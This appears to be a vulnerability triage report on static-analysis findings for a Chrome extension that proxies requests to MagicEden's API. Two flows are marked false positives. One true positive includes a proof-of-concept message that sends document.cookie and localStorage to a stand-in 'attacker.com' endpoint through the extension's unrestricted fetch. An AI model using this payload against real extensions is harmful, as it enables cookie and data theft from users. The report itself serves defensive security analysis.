# CoCo Analysis: mmpooepopgcoeadeopohjlfekbkfnjoa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 9 (5 fetch_resource_sink, 4 variations; 1 window_postMessage_sink)

---

## Sink Group 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink (Lines 1065)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mmpooepopgcoeadeopohjlfekbkfnjoa/opgen_generated_files/bg.js
Line 1065: Multiple flows from a.collectionName, a.searchTerm, a.mint to fetchUrl()

**Code:**

```javascript
// Background script - bg.js Line 1065
chrome.runtime.onMessageExternal.addListener(function(a,b,c){
  // Flow 1 & 2: collectionName and searchTerm into URL query
  void 0!==a.collectionName&&(
    b="https://api-mainnet.magiceden.io/rpc/getListedNFTsByQuery?q="+
      encodeURIComponent(JSON.stringify({
        $match:{
          collectionSymbol:a.collectionName, // ← attacker-controlled
          $text:{$search:a.searchTerm}       // ← attacker-controlled
        },
        $sort:{createdAt:-1},$skip:0,$limit:20,status:[]
      })),
    fetchUrl(b).then(function(d){c(d)}) // Sends response back
  );

  // Flow 3: mint into URL path
  void 0!==a.mint&&
    fetchUrl("https://api-mainnet.magiceden.io/rpc/getNFTByMintAddress/"+a.mint) // ← attacker-controlled
    .then(function(d){c(d)}); // Sends response back

  // NOT SHOWN: requestUrl flow analyzed separately
});
```

**Classification:** FALSE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Reason:** Data TO hardcoded backend URLs (trusted infrastructure). While the extension accepts external messages and uses attacker-controlled data (a.collectionName, a.searchTerm, a.mint) in fetch requests, the destination URLs are hardcoded to the developer's trusted backend: `https://api-mainnet.magiceden.io/rpc/*`.

According to the methodology: "Hardcoded backend URLs are still trusted infrastructure. Data TO/FROM developer's own backend servers = FALSE POSITIVE. Attacker sending data to `hardcoded.com` = FALSE POSITIVE. Compromising developer infrastructure is separate from extension vulnerabilities."

The attacker can only send requests to the developer's trusted API, not to attacker-controlled destinations. This is by design - the extension is acting as a proxy to MagicEden's API.

---

## Sink Group 2: bg_chrome_runtime_MessageExternal → fetch_resource_sink (requestUrl)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mmpooepopgcoeadeopohjlfekbkfnjoa/opgen_generated_files/bg.js
Line 1065-1066: requestUrl and requestOptions flow

**Code:**

```javascript
// Background script - bg.js Lines 1065-1066
chrome.runtime.onMessageExternal.addListener(function(a,b,c){
  // Previous flows omitted...

  void 0!==a.requestUrl&&(
    b={},
    void 0!==a.requestOptions&&(b=a.requestOptions), // ← attacker-controlled options
    fetchUrl(a.requestUrl,b).then(function(d){c(d)}) // ← attacker-controlled URL
  )
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (https://soltools.xyz/* or http://127.0.0.1:5500/*)
chrome.runtime.sendMessage(
  'EXTENSION_ID',
  {
    requestUrl: 'http://attacker.com/steal',
    requestOptions: {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage
      })
    }
  },
  (response) => {
    console.log('Exfiltrated via extension:', response);
  }
);
```

**Impact:** Privileged cross-origin request to attacker-controlled destination. The extension accepts completely attacker-controlled URL (a.requestUrl) and fetch options (a.requestOptions) from external messages, performs a privileged fetch with the extension's permissions, and sends the response back to the attacker via sendResponse (c(d)). This allows:

1. **SSRF (Server-Side Request Forgery):** Attacker can make the extension fetch from internal networks, localhost, or any URL
2. **Data Exfiltration:** Attacker can send sensitive data to attacker-controlled servers
3. **Bypassing CORS:** The extension makes requests with elevated privileges, bypassing same-origin policy

Even though the manifest specifies `externally_connectable` with limited domains (https://soltools.xyz/*, http://127.0.0.1:5500/*), according to the methodology: "IGNORE manifest.json externally_connectable restrictions! If the code allows chrome.runtime.onMessageExternal, assume ANY attacker can exploit it. If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE."

---

## Sink 3: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mmpooepopgcoeadeopohjlfekbkfnjoa/opgen_generated_files/cs_2.js
Line 534: chrome.storage.sync.get → window.postMessage

**Code:**

```javascript
// Content script - cs_2.js Line 534
window.addEventListener("load",connectTool,!1);
function connectTool(){
  window.postMessage({type:"soltools",text:"extensionInstalled"},"*");

  chrome.storage.sync.get("connectedWallet",function(a){
    a=a.connectedWallet;
    void 0!==a&&window.postMessage({
      type:"soltools",
      text:"walletConnected",
      publicKey:a.publicKey // ← data from storage posted to webpage
    },"*")
  })
}
```

**Classification:** FALSE POSITIVE

**Reason:** No attacker control over storage data source. This flow reads from chrome.storage.sync.get("connectedWallet") and posts the publicKey to the webpage via window.postMessage. However, this is NOT exploitable because:

1. **No Storage Poisoning Path:** There is no code in the extension that allows an external attacker to write attacker-controlled data to the "connectedWallet" storage key. The storage is only written by the extension's internal logic (likely the extension's own UI where users connect their wallet).

2. **User-Generated Data ≠ Attacker Data:** The connectedWallet data represents a wallet that the user themselves connected through the extension's UI. This is user-generated data, not attacker-controlled data.

3. **Incomplete Exploitation Chain:** For this to be a TRUE POSITIVE, there would need to be an attacker-accessible path to poison the "connectedWallet" storage (e.g., via external messages or window.postMessage), but no such path exists in the codebase.

According to the methodology, this does not meet the TRUE POSITIVE criteria because the attacker cannot control the data flowing through this sink.
